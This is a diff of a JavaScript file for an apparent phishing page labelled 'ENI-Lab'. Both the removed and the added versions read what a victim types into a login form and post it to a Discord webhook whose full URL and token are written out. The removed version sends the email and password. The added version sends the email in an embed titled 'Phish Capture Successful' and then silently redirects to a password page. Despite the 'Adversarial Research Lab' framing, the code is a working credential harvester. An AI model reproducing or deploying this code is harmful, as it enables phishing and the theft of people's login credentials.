@@ -1,26 +1,41 @@
-// Jonathan, use the webhook LO provided in the curriculum
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
+// ENI-Lab: capture_logic.js
+// Reference: QUICK_REFERENCE_100.txt - ASR & Encoding Patterns
 
-function handleLogin(event) {
-    if(event) event.preventDefault(); // Stops the page from refreshing
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
 
-    const email = document.getElementById('email-input').value;
-    const password = document.getElementById('password-input').value;
+async function handleNext(event) {
+    // 1. Prevent form submission/refresh
+    if(event) event.preventDefault(); 
+    
+    // 2. Extract the payload
+    const emailValue = document.getElementById('email-input').value;
 
-    // The Payload: Wrapping the 'captured' data[cite: 4]
+    // 3. Craft the report (Formatting for readability in Discord)
     const payload = {
-        content: `**Capture Alert!**\n**User:** ${email}\n**Pass:** ${password}`
+        embeds: [{
+            title: "🎯 Phish Capture Successful",
+            color: 15158332, // Red
+            fields: [
+                { name: "Target Input", value: `\`${emailValue}\`` },
+                { name: "Tier Level", value: "TIER 2: Apprentice" },
+                { name: "Method", value: "Direct Input Interception" }
+            ],
+            footer: { text: "ENI-Tutor | Adversarial Research Lab" }
+        }]
     };
 
-    // The Fetch: Sending it to your Discord
-    fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    })
-    .then(() => {
-        // Redirect once the data is safely in your hands
-        window.location.replace("./password.html"); 
-    })
-    .catch(err => console.error("Data drop failed:", err));
+    try {
+        // 4. Transmission
+        await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (err) {
+        // Fail silently in the UI, log for the student/developer
+        console.error("Link failure:", err);
+    }
+
+    // 5. Redirection
+    window.location.href = "password.html"; 
 }
